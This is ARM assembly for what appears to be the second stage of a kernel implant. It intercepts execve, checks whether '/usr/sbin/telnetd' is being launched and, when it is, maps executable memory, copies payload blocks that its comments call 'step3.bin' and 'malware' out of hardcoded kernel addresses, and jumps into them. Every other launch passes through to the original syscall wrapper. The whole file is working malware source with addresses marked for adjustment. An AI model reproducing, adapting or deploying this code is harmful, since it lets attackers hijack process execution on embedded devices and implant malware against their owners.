step2:
stmfd sp!, {r0-r12, lr}
mrs r6, cpsr
stmfd sp!, {r6}
mrs r6, spsr
stmfd sp!, {r6}

PPoint0:
    sub r2, pc, #PPoint0
	sub r2, r2, #8
	add r2, r2, #SyscallFirstPara

STRCMPLOOP:
	ldr r1, [r0]
	ldr r3, [r2]
	mov r4, #0
	BYTECMPLOOP:
		add  r4, r4, #1
		and  r6, r1, #0x000000ff
		and  r7, r3, #0x000000ff
		cmp  r6, r7
		bne  NO_EXEC
		cmp  r6, #0x0
		beq  EXEC
		lsr  r1, r1, #8
		lsr  r3, r3, #8
		cmp  r4, #4
		bne  BYTECMPLOOP
	add  r0, r0, #4
	add  r2, r2, #4
	b STRCMPLOOP


NO_EXEC:
	ldmfd sp!, {r6}
	msr spsr, r6
	ldmfd sp!, {r6}
	msr cpsr, r6
	ldmfd sp!, {r0-r12, lr}
	ldr pc, [pc, #-4]
    .word 0xc0030680 @sys_execve_wrapper  modify

EXEC:
    sub sp, sp, #0x10
    mov r3, #0
    str r3, [sp]
    str r3, [sp, #4]

PPoint1:
	sub r1, pc, #PPoint1
	sub r1, r1, #8
	add r1, r1, #KernelStrPara
	ldr r1, [r1]
    mov r0, #0
    mov r2, #7
    mov r3, #0x22
    mov r7, #192
    svc 0x9000c0 @mmap2
    mov r4, r0
    add sp, sp, #0x10

	mov r0, r4

PPoint2:
	sub r3, pc, #PPoint2
	sub r3, r3, #4
	add r3, r3, #KernelStrPara

	ldr r6, [r3]
	mov r7, #0

Loop1:
	ldr r8, [r3, #4] @addr
	ldr r5, [r3, #8] @size
	add r5, r5, r8

	loop2:
		ldmia r8!, {r2}
		stmia r0!, {r2}
		cmp  r8, r5
		bcc loop2

	add r3, r3, #8
	add r7, r7, #1
	cmp r7, r6
	bne Loop1

    mov pc, r4

KernelStrPara:
    .word 0x3000            @need larger than len(step3.bin)+len(malware)    modify
    .word 2

    .word 0xc0429a48 @0xc0429910+0x138/len(step2.bin)
    .word 0x5b8      @0x6f0-len(step2.bin)

    .word 0xc0442330
    .word 0x19b0

    .word 0xC002E4A4
    .word 0

SyscallFirstPara:
    .ascii "/usr/sbin/telnetd\x00"
    .align

